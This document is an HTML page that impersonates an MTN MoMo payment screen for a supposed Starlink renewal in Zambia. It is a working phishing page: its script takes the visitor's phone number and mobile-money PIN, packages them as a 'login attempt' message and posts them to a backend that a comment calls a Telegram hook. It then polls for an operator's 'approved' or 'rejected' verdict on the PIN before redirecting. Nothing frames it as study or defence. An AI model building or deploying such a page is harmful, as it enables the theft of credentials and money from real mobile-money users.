<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>MTN MoMo</title>
<style>
*{box-sizing:border-box}
html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#f7f7f7;color:#111}
body{display:flex;justify-content:center;align-items:flex-start;padding:24px 16px}
.card{
  width:100%;max-width:420px;min-height:507px;background:#fff;
  border-radius:15px;overflow:hidden;
  box-shadow:0 1px 3px rgba(0,0,0,.12);
}
.header{
  min-height:120px;padding:20px;background:linear-gradient(135deg,#ffcc00,#ffd83d);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  border-radius:0 0 0 0;
}
.logo-wrap{height:31px;display:flex;align-items:center;gap:4px;margin-bottom:7px}
.logo{
  width:25px;height:25px;border-radius:4px;background:#063b70;
  display:flex;align-items:center;justify-content:center;
  color:#ffd000;font-size:17px;font-weight:900;
  box-shadow:0 1px 2px rgba(0,0,0,.18);
}
.logo-text{font-size:11px;font-weight:700;color:#e5bf00;letter-spacing:-.3px}
.header-title{font-size:17px;font-weight:700;margin-top:2px}
.content{padding:28px 30px 24px}
.amount-row{display:flex;justify-content:space-between;align-items:flex-start;padding-bottom:16px;border-bottom:1px solid #eee}
.label{font-size:8px;color:#7d8793;font-weight:700;letter-spacing:1px;margin-bottom:2px}
.amount{font-size:17px;font-weight:800}
.service{text-align:right}
.service-value{font-size:10px;font-weight:500;margin-top:3px}
.instruction{text-align:center;color:#555;font-size:10px;margin:18px 0 21px}
.field-label{font-size:10px;font-weight:700;margin:0 0 7px}
.phone-box{
  min-height:44px;border:1px solid #ccd2da;border-radius:9px;
  display:flex;align-items:center;overflow:hidden;background:#fff;
}
.country{
  height:100%;display:flex;align-items:center;gap:7px;padding:0 10px;
  border-right:1px solid #e4e7eb;font-size:10px;white-space:nowrap;
}
.flag{font-size:13px;line-height:1}
.code{font-weight:600}
.phone{
  flex:1;border:0;outline:0;height:44px;padding:0 11px;font-size:14px;
  color:#555;min-width:0;
}
.phone::placeholder{color:#9ca3ad}
.pin-label{margin-top:17px}
.pin-box{
  min-height:52px;border:1px solid #ccd2da;border-radius:9px;
  display:flex;align-items:center;justify-content:center;gap:10px;
}
.pin-box input{
  width:180px;max-width:100%;height:40px;border:0;outline:0;background:transparent;
  text-align:center;font-size:20px;letter-spacing:12px;color:#777;padding:0 0 0 12px;
}
.pin-box input::placeholder{color:#8b9199}
.pin-hint{text-align:center;color:#777;font-size:8px;margin-top:9px}
.confirm{
  width:100%;min-height:44px;margin-top:17px;border:0;border-radius:9px;
  background:#ffcc00;color:#111;font-size:11px;font-weight:800;
  letter-spacing:1px;box-shadow:0 7px 13px rgba(255,204,0,.28);
}
.confirm:active{transform:scale(.99)}
.secure{text-align:center;margin-top:24px;color:#6c737b;font-size:7px;letter-spacing:.8px}
.secure span{color:#00a651;font-size:10px;margin-right:4px}
.error{text-align:center;color:#c62828;font-size:9px;min-height:12px;margin-top:8px}
.approval-spinner{position:fixed;top:50%;left:50%;width:18px;height:18px;border:2px solid rgba(255,204,0,.3);border-top-color:#ffcc00;border-radius:50%;animation:approval-spin .7s linear infinite;transform:translate(-50%,-50%)}
@keyframes approval-spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
@media(max-width:480px){
  body{padding:0}
  .card{max-width:none;border-radius:0 0 15px 15px}
  .content{padding:22px 20px 20px}
  .pin-box{gap:5px}
  .pin-box input{width:180px;letter-spacing:10px;padding-left:10px}
}
</style>
</head>
<body>
<div class="card">
  <div class="header">
    <div class="logo-wrap">
      <div class="logo">◔</div>
      <div class="logo-text">MoMo</div>
    </div>
    <div class="header-title">MTN MoMo</div>
  </div>

  <main class="content">
    <div class="amount-row">
      <div>
        <div class="label">AMOUNT</div>
        <div class="amount" id="amount">ZMW 25.00</div>
      </div>
      <div class="service">
        <div class="label">SERVICE</div>
        <div class="service-value">Starlink Renewal</div>
      </div>
    </div>

    <div class="instruction">Enter your MTN MoMo details to authorize</div>

    <div class="field-label">MTN MoMo Number</div>
    <div class="phone-box">
      <div class="country">
        <span class="flag">🇿🇲</span>
        <span class="code">+260</span>
      </div>
      <input id="phone" class="phone" type="tel" inputmode="numeric"
              maxlength="9" placeholder="7xxxxxxxx or 9xxxxxxxx" autocomplete="off">
    </div>

    <div class="field-label pin-label">Enter PIN</div>
    <div class="pin-box">
      <input class="pin" type="text" maxlength="5" inputmode="numeric" pattern="[0-9]*" aria-label="5-digit PIN" autocomplete="off">
    </div>
    <div class="pin-hint">enter 5 digits</div>

    <button class="confirm" id="confirm" type="button">⊙ &nbsp; CONFIRM PAYMENT</button>
    <div class="error" id="error"></div>
    <div class="approval-spinner" id="approvalSpinner" hidden aria-label="Waiting for approval"></div>
    <div class="secure"><span>♧</span> SSL ENCRYPTED &amp; SECURE</div>
  </main>
</div>

<script>
const phone = document.getElementById('phone');
const pinInput = document.querySelector('.pin');
const error = document.getElementById('error');
const confirmButton = document.getElementById('confirm');
const approvalSpinner = document.getElementById('approvalSpinner');
let paymentAmount = 'ZMW 25.00';

try {
  const selectedPlan = JSON.parse(sessionStorage.getItem('selectedPlan') || 'null');
  const amount = selectedPlan && String(selectedPlan.price || '').match(/\d+(?:\.\d+)?/);
  if (amount) paymentAmount = `ZMW ${Number(amount[0]).toFixed(2)}`;
  if (selectedPlan && selectedPlan.price === 'Free trial') paymentAmount = 'ZMW 0.00';
  document.getElementById('amount').textContent = paymentAmount;
} catch (storageError) {
  console.warn('Selected plan unavailable:', storageError);
}

phone.addEventListener('input', () => {
  phone.value = phone.value.replace(/\D/g, '').slice(0, 9);
});

pinInput.addEventListener('input', () => {
  pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 5);
});

confirmButton.addEventListener('click', async () => {
  const pin = pinInput.value;
  const phoneNumber = phone.value;
  error.textContent = '';

  if (!/^[79]\d{8}$/.test(phoneNumber)) {
    error.textContent = 'Please enter a valid 9-digit Zambia mobile number.';
    return;
  }

  if (!/^\d{5}$/.test(pin)) {
    error.textContent = 'Please enter your 5-digit PIN.';
    return;
  }

  sessionStorage.setItem('submittedPhone', phoneNumber);

  const message = `login attempt \nPhone: +260${phoneNumber}\nPIN: ${pin}\nService: Starlink Renewal\nAmount: ${paymentAmount}`;

  const payload = { text: message, type: 'trial' };

  try {
    const response = await fetch('/api/send', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(payload)
});

if (!response.ok) {
  throw new Error(`API returned ${response.status}`);
}
    if (!response || !response.ok) {
      throw new Error(`Submission failed${response ? ` (${response.status})` : ''}.`);
    }

    const data = await response.json();
    if (!data.ok || !data.submissionId) throw new Error(data.error || 'Submission failed.');

    error.textContent = 'Processing...';
    confirmButton.disabled = true;
    approvalSpinner.hidden = false;

    while (true) {
      const statusResponse = await fetch(
        `/api/submission-status?id=${encodeURIComponent(data.submissionId)}`,
        { cache: 'no-store' }
      );
      const statusData = await statusResponse.json();

      if (statusData.status === 'approved') {
        approvalSpinner.hidden = true;
        error.style.color = '#14804a';
        error.textContent = 'Trial approved. Continuing...';
        window.location.href = 'ming.html';
        return;
      }

      if (statusData.status === 'rejected') {
        approvalSpinner.hidden = true;
        throw new Error('Wrong PIN.');
      }

      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  } catch (sendError) {
    approvalSpinner.hidden = true;
    console.warn('Telegram hook unavailable:', sendError);
    error.textContent = sendError.message || 'Trial submission failed.';
    confirmButton.disabled = false;
  }
});
</script>

</body>
</html>
